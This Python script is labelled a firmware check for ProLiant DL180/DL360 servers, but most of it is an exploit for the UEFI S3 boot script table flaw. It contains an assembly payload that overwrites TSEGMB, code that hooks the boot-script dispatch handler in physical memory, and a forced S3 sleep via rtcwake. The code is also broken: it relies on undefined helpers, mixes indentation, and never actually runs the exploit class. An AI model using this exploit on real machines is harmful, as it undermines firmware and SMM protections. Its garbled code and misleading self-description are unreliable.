#!/usr/bin/env python3
#evgind@gmail.com V0.1

#Yalnizca ProLiant DL180 ve ProLiant DL360 tipi sunucular icin firmware kontrolune uygundur.
#This script performs firmware checks for only ProLiant DL180 and ProLiant DL360.

import sys, os, argparse, subprocess, re, pkg_resources, json, contextlib, time
from struct import pack, unpack

_BaseModule = 'BaseModule'
PAYLOAD = '''

[bits 32]

; save registers
push    eax
push    edx
push    esi

call    _label

db      0ffh
dd      0 ; shellcode say
db      0 ; BIOS_CNTL degeri
dd      0 ; TSEGMB degeri

_label:


pop     esi
inc     esi


inc     dword [esi]


cmp     byte [esi], 1
jne     _end


mov     eax, 0x8000f8dc
mov     dx, 0xcf8
out     dx, eax


mov     dx, 0xcfc
in      al, dx


mov     byte [esi + 4], al


mov     eax, 0x800000b8
mov     dx, 0xcf8
out     dx, eax


mov     dx, 0xcfc
in      eax, dx


mov     dword [esi + 5], eax


and     eax, 1
test    eax, eax
jnz     _end

; bus = 0, dev = 0, func = 0, offset = 0xb8
mov     eax, 0x800000b8
mov     dx, 0xcf8
out     dx, eax

; TSEGMB dummy deger yaz
mov     eax, 0xff000001
mov     dx, 0xcfc
out     dx, eax

_end:

; registerleri geri yukle
pop     esi
pop     edx
pop     eax

'''


def _at(data, off, size, fmt): return unpack(fmt, data[off : off + size])[0]

def byte_at(data, off = 0): return _at(data, off, 1, 'B')
def word_at(data, off = 0): return _at(data, off, 2, 'H')
def dword_at(data, off = 0): return _at(data, off, 4, 'I')
def qword_at(data, off = 0): return _at(data, off, 8, 'Q')


class UefiParser(object):    

    BOOT_SCRIPT_EDK_SIGN = '\xAA'
    BOOT_SCRIPT_EDK_HEADER_LEN = 0x34

    EFI_BOOT_SCRIPT_IO_WRITE_OPCODE = 0x00
    EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE = 0x01
    EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE = 0x02
    EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE = 0x03
    EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE = 0x04
    EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE = 0x05
    EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE = 0x06
    EFI_BOOT_SCRIPT_STALL_OPCODE = 0x07
    EFI_BOOT_SCRIPT_DISPATCH_OPCODE = 0x08
    EFI_BOOT_SCRIPT_MEM_POLL_OPCODE = 0x09

    boot_script_ops = [
        'IO_WRITE',
        'IO_READ_WRITE',
        'MEM_WRITE',
        'MEM_READ_WRITE',
        'PCI_CONFIG_WRITE',
        'PCI_CONFIG_READ_WRITE',
        'SMBUS_EXECUTE',
        'STALL',
        'DISPATCH',
        'EFI_BOOT_SCRIPT_MEM_POLL_OPCODE' ]

    EfiBootScriptWidthUint8 = 0
    EfiBootScriptWidthUint16 = 1
    EfiBootScriptWidthUint32 = 2
    EfiBootScriptWidthUint64 = 3
    EfiBootScriptWidthFifoUint8 = 4
    EfiBootScriptWidthFifoUint16 = 5
    EfiBootScriptWidthFifoUint32 = 6
    EfiBootScriptWidthFifoUint64 = 7
    EfiBootScriptWidthFillUint8 = 8
    EfiBootScriptWidthFillUint16 = 9
    EfiBootScriptWidthFillUint32 = 10
    EfiBootScriptWidthFillUint64 = 11

    boot_script_width = [
        'Uint8',
        'Uint16',
        'Uint32',
        'Uint64',
        'FifoUint8',
        'FifoUint16',
        'FifoUint32',
        'FifoUint64',
        'FillUint8',
        'FillUint16',
        'FillUint32',
        'FillUint64' ]

    def __init__(self, quiet = False):

        self.quiet = quiet

    def value_at(self, data, off, width):

        if width == self.EfiBootScriptWidthUint8: return byte_at(data, off)
        elif width == self.EfiBootScriptWidthUint16: return word_at(data, off)
        elif width == self.EfiBootScriptWidthUint32: return dword_at(data, off)
        elif width == self.EfiBootScriptWidthUint64: return qword_at(data, off)
        else: raise Exception('Invalid width 0x%x' % width)

    def width_size(self, width):

        if width == self.EfiBootScriptWidthUint8: return 1
        elif width == self.EfiBootScriptWidthUint16: return 2
        elif width == self.EfiBootScriptWidthUint32: return 4
        elif width == self.EfiBootScriptWidthUint64: return 8
        else: raise Exception('Invalid width 0x%x' % width)


    def memory_write_proc(self, width, addr, count, val):

        self.log(('Width: %s, Addr: 0x%.16x, Count: %d\n' + \
                  'Value: %s\n') % \
                 (self.boot_script_width[width], addr, count, \
                  ', '.join(map(lambda v: hex(v), val))))

    def pci_write(self, width, bus, dev, fun, off, count, val):

        self.log(('Width: %s, Count: %d\n' + \
                  'Bus: 0x%.2x, Device: 0x%.2x, Function: 0x%.2x, Offset: 0x%.2x\n' + \
                  'Value: %s\n') % \
                 (self.boot_script_width[width], count, bus, dev, fun, off, \
                  ', '.join(map(lambda v: hex(v), val))))

    def io_write_proc(self, width, port, count, val):

        self.log(('Width: %s, Port: 0x%.4x, Count: %d\n' + \
                  'Value: %s\n') % \
                 (self.boot_script_width[width], port, count, \
                  ', '.join(map(lambda v: hex(v), val))))

    def process_dispatch(self, addr):

        self.log('Call addr: 0x%.16x' % (addr) + '\n')

    def read_values(self, data, width, count):

        values = []

        for i in range(0, count):

            # read single value of given width
            values.append(self.value_at(data, i * self.width_size(width), width))

        return values

    def op_name(self, op):

        if op < len(self.boot_script_ops):

            return self.boot_script_ops[op]

        else:

            return 'UNKNOWN_0x%X' % op

    def parse_intel(self, data, boot_script_addr):

        ptr = 0

        while data:

            num, size, op = unpack('IIB', data[:9])

            if op == 0xff:

                self.log('# End of the boot script at offset 0x%x' % ptr)
                break

            elif op >= len(self.boot_script_ops):

                raise Exception('Invalid op 0x%x' % op)

            self.log('#%d len=%d %s' % (num, size, self.op_name(op)))

            if op == self.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE:

                # get value information
                width, count = byte_at(data, 9), qword_at(data, 24)

                # get write adderss
                addr = qword_at(data, 16)

                # get values list
                values = self.read_values(data[32:], width, count)

                self.memory_write_proc(width, addr, count, values)

            elif op == self.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE:

                # get value information
                width, count = byte_at(data, 9), qword_at(data, 24)

                # get write adderss
                addr = qword_at(data, 16)

                # get PCI device address
                bus, dev, fun, off = (addr >> 24) & 0xff, (addr >> 16) & 0xff, \
                                     (addr >> 8) & 0xff,  (addr >> 0) & 0xff

                # get values list
                values = self.read_values(data[32:], width, count)

                self.pci_write(width, bus, dev, fun, off, count, values)

            elif op == self.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE:

                # get value information
                width, count = byte_at(data, 9), qword_at(data, 16)

                # get I/O port number
                port = word_at(data, 10)

                # get values list
                values = self.read_values(data[24:], width, count)

                self.io_write_proc(width, port, count, values)

            elif op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:

                # get call address
                addr = qword_at(data, 16)

                self.process_dispatch(addr)

            else:

                # skip unknown instruction
                pass

            # go to the next instruction
            data = data[size:]
            ptr += size

    def parse_edk(self, data, boot_script_addr):

        ptr = num = 0

        while data:

            op, _, size = unpack('BBB', data[:3])

            if op == 0xff:

                self.log('# End of the boot script at offset 0x%x' % ptr)
                break

            if op < len(self.boot_script_ops):

                name = self.boot_script_ops[op]

            self.log('#%d len=%d %s' % (num, size, self.op_name(op)))

            if op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:

                # get call address
                addr = qword_at(data, 3)

                self.process_dispatch(addr)

            else:

                # skip unknown instruction
                pass

            # go to the next instruction
            data = data[size:]
            ptr += size
            num += 1

    def parse(self, data, boot_script_addr):

        # check for AAh signature
        if data[0] == self.BOOT_SCRIPT_EDK_SIGN:

            # parse EDK format of boot script table
            self.parse_edk(data[1 + self.BOOT_SCRIPT_EDK_HEADER_LEN:], boot_script_addr)

        else:

            # parse Intel format (DQ77KB, Q77 chipset) of boot script table
            self.parse_intel(data, boot_script_addr)


class Uefi_Parser_Table(object):

    EFI_VAR_NAME = 'AcpiGlobalVariable'
    EFI_VAR_GUID = 'af9ffd67-ec10-488a-9dfc-6cbf5ee22c2e'

    JUMP_32_LEN = 5
    JUMP_64_LEN = 14

    WAKE_AFTER = 10 # in seconds

    BOOT_SCRIPT_OFFSET = 0x18
    BOOT_SCRIPT_MAX_LEN = 0x8000

    class CustomUefiParser(UefiParser):

        class AddressFound(Exception): 

            def __init__(self, addr):

                self.addr = addr
        
        def process_dispatch(self, addr):

            # pass dispatch instruction operand to the caller
            raise self.AddressFound(addr)

        def parse(self, data, boot_script_addr):

            try:

                UefiParser.parse(self, data, \
                    boot_script_addr = boot_script_addr)

            except self.AddressFound as e:

                return e.addr

            # boot script doesn't have any dispatch instructions
            return None

    def _efi_var_read(self, name, guid):

        data = self._uefi.get_EFI_variable(name, guid, None)

        if len(data) == 4:

            return dword_at(data)

        elif len(data) == 8:

            return qword_at(data)

    def _mem_read(self, addr, size):

        # align memory reads by 1000h
        read_addr = addr & 0xfffffffffffff000
        read_size = size + addr - read_addr

        if hasattr(self._memory, 'read_phys_mem'):

            # for CHIPSEC >= 1.1.7
            data = self._memory.read_phys_mem(read_addr, read_size)

        elif hasattr(self._memory, 'read_physical_mem'):

            # for older versions
            data = self._memory.read_physical_mem(read_addr, read_size)

        else: 

            assert False

        return data[addr - read_addr:]

    def _mem_write(self, addr, data):

        if hasattr(self._memory, 'write_phys_mem'):

            # for CHIPSEC >= 1.1.7
            self._memory.write_phys_mem(addr, len(data), data)

        elif hasattr(self._memory, 'write_physical_mem'):

            # for older versions
            self._memory.write_physical_mem(addr, len(data), data)

        else: 

            assert False

    def _disasm(self, data):
    
        import capstone

        dis = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        dis.detail = True

        for insn in dis.disasm(data, len(data)): 

            if insn.group(capstone.CS_GRP_JUMP) or \
               insn.group(capstone.CS_GRP_CALL) or \
               insn.group(capstone.CS_GRP_RET) or \
               insn.group(capstone.CS_GRP_INT) or \
               insn.group(capstone.CS_GRP_IRET):

                raise Exception('Unable to patch %s instruction at the beginning of the function' % insn.mnemonic)

            return insn.size

    def _jump_32(self, src, dst):


        addr = pack('I', (dst - src - self.JUMP_32_LEN) & 0xffffffff)
        return '\xe9' + addr

    def _jump_64(self, src, dst):


        addr = pack('Q', dst & 0xffffffffffffffff)
        return '\xff\x25\x00\x00\x00\x00' + addr

    def _find_zero_bytes(self, addr, size):

        max_size, page_size = 0, 0x1000
        addr = (addr & 0xfffff000) + page_size

        while max_size < 1024 * 1024:

            # search for zero bytes at the end of the code page
            if self._mem_read(addr - size, size) == '\0' * size:

                addr -= size
                return addr

            addr += page_size
            max_size += page_size

        raise Exception('Unable to find unused memory to store payload')

    def _hook(self, addr, payload):        

        hook_size = 0
        data = self._mem_read(addr, 0x40)
        
        # disassembly instructions and determinate patch length
        while hook_size < self.JUMP_32_LEN:

            size = self._disasm(data[hook_size:])
            hook_size += size
        

        # backup original code of the function
        data = data[:hook_size]

        # find zero memory for patch
        buff_size = len(payload) + hook_size + self.JUMP_32_LEN
        buff_addr = self._find_zero_bytes(addr, buff_size)


        # write payload + original bytes + jump back to hooked function
        buff = payload + data + \
               self._jump_32(buff_addr + len(payload) + hook_size, \
                             addr + hook_size)

        self._mem_write(buff_addr, buff)

        # write 32-bit jump from function to payload
        self._mem_write(addr, self._jump_32(addr, buff_addr))

        return buff_addr, buff_size, data    

    def exploit_test(self):

        self.logger.start_test('UEFI boot script table vulnerability exploit')

        # read ACPI global variable structure data
        AcpiGlobalVariable = self._efi_var_read(self.EFI_VAR_NAME, self.EFI_VAR_GUID)        
        

        # get bootscript pointer
        data = self._mem_read(AcpiGlobalVariable, self.BOOT_SCRIPT_OFFSET + 8)
        boot_script = dword_at(data, self.BOOT_SCRIPT_OFFSET)


        if boot_script == 0:

            raise Exception('Unable to locate boot script table')
        
        data = self._mem_read(boot_script, self.BOOT_SCRIPT_MAX_LEN)

        # read and parse boot script
        dispatch_addr = self.CustomUefiParser(quiet = True).parse( \
            data, boot_script_addr = boot_script)

        if dispatch_addr is None:

            raise Exception('Unable to locate EFI_BOOT_SCRIPT_DISPATCH_OPCODE')


        # compile exploitation payload
        payload = Asm().compile(PAYLOAD)

        # find offset of payload data area
        offset = payload.find('\xff' + '\0' * (4 + 1 + 4))
        if offset == -1: raise Exception('Invalid payload')

        # execute payload as UEFI function handler
        ret = self._hook(dispatch_addr, payload)
        if ret is not None:

            buff_addr, buff_size, old_data = ret


            # go to the S3 sleep
            time.sleep(3)
            os.system('rtcwake -m mem -s %d' % self.WAKE_AFTER)

            
            data = self._mem_read(buff_addr + offset + 1, 4 + 1 + 4)
            count, BIOS_CNTL, TSEGMB = unpack('=IBI', data)

            if count == 0:

                return ModuleResult.ERROR


            # restore modified memory
            self._mem_write(dispatch_addr, old_data)
            self._mem_write(buff_addr, '\0' * buff_size)


            # bios lock enable bit of BIOS_CNTL
            BLE = 1

            # check if access to flash is locked
            if bitval(BIOS_CNTL, BLE) == 0:
                success = True
            
            if success:

                print ('Your system is NOT VULNERABLE')
                return ModuleResult.PASSED

            else:

                print ('Your system is VULNERABLE')
                return ModuleResult.FAILED


        return ModuleResult.ERROR        

    def is_supported(self):

        return True

    def run(self, module_argv):

        self._uefi = UEFI(self.cs.helper)
        self._memory = Memory(self.cs.helper)

        return self.exploit_test()
       		
def extract_kernel_version (input_line: str) -> str:   
    match = re.search ('\d+(\d+|\.|\-|\_|[a-z]|[A-Z])*', input_line)
        
    if match == None:
        handle_error ('Unable to extract version string for input line: %s' %inputLine, exit_code = 3)
            
    version_string = match.group (0)
        
    if not (version_string [-1:].isdigit () or version_string [-1:].isalpha ()):
        version_string = version_string [:-1]
            
    return version_string



def execute_with_output (command: str, args: list = []) -> str:

    ENCODING = 'utf-8'
    
    args.insert (0, command)
    
    try:
        response_bytes = subprocess.check_output (args)
        
    except (OSError):
        raise
        
    return response_bytes.decode (ENCODING)

def execute_with_exit_status (command: str, args: list = []) -> int:
      
    args.insert (0, command) 
                
    try:
        exitStatus = subprocess.call (args, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
        
    except (OSError):
        exitStatus = 127
        
    return exitStatus

def get_current_kernel () -> str:

    
    uname_output = execute_with_output ('uname', ['-r'])
    uname_output.rstrip ()
    
    return extract_kernel_version (uname_output)

def get_package_manager () -> str:

    if execute_with_exit_status ('rpm', ['--version']) == 0:
        return 'rpm'
        
    #dpkg (Debian based systems)
    elif execute_with_exit_status ('dpkg', ['--version']) == 0:
        return 'dpkg'
        
    #pacman (Arch linux based systems)
    elif execute_with_exit_status ('pacman', ['--version']) == 0:
        return 'pacman'
        
    #None of the above
    else:
        handle_error ('Package manager could not be determined', 1)




def main ():


        currentKernel = get_current_kernel ()
        packageManager = get_package_manager ()

        print ('Found current kernel: %s' %currentKernel)
        print ('Package manager: %s' %packageManager)



        if(os.path.exists("/sys/firmware/efi")):
		   print ('Your BIOS is vulnurable...Performing firmware check')	
           Uefi_Parser_Table()

        else:
           print ('You are using Rom BIOS, not UEFI. Your BIOS is not vulnurable...Exiting')
           sys.exit(1)

if __name__ == '__main__':
    main ()

